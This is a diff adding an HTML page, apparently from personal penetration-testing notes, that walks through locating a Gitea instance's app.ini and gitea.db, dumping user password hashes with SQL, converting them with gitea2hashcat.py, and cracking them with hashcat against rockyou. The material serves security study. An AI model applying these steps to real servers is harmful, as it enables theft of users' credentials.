@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Gitea</h1>
+            <p>Gitea is a painless, self-hosted, all-in-one software development service. It includes Git hosting, code review, team collaboration, package registry, and CI/CD. It is similar to GitHub, Bitbucket and GitLab.</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <p>Normally you could find gitea in <b>dev.domain.local</b></p>
+            <ul>    
+                <h3>Database</h3>
+                <ul>
+                <p>In gitea there is a database which contains a part from other things the usernames and password of all users logged in. In order to find this database we should check <b>app.ini</b> file</p>
+                <p>Path may vary dependin on the environment</p>
+                <pre><code class="language-bash"> /data/gitea/conf/app.ini </code></pre>
+                <p>Following this file we may find the database file <b>gitea.db</b> in the following path</p>
+                <pre><code class="language-bash"> gitea/data/gitea/gitea.db </code></pre>
+                </ul>
+                
+                <h3>Cracking database passwords</h3>
+                <ul>
+                <p>Gitea store hashes in a special format so we will use a python script that help us to acquire a string which hashcat can use. Script can be found <a class="notion-link" href="https://github.com/unix-ninja/hashcat/blob/faa680fbab803723d77449b7107c1c985a6b7981/tools/gitea2hashcat.py">Here</a> </p>
+                <p>First of all we need to select data</p>
+                <pre><code class="language-sql">select email,salt,passwd,passwd_hash_algo from user;
+admin|f38b580638449075e4edb39d46f4b3e2|4b8c6297fb37feed46659121af08de38057bbe53d4225c880bcb634039ff96b8ea0391e1a5e34cf4f8a016c54a2d15c46f36|pbkdf2$50000$50 </code></pre>
+                <p>Now use the salt|passwd</p>    
+                <pre><code class="language-bash"> gitea2hashcat.py "f38b580638449075e4edb39d46f4b3e2|4b8c6297fb37feed46659121af08de38057bbe53d4225c880bcb634039ff96b8ea0391e1a5e34cf4f8a016c54a2d15c46f36" </code></pre>
+                <p>Use the resulting string in hashcat with the following command</p>
+                <pre><code class="language-bash"> hashcat -m 10900 admin.hash /usr/share/wordlists/rockyou.txt </code></pre>
+                </ul>    
+            </ul>    
+        </div>
+    </div>
+</body>
+</html>
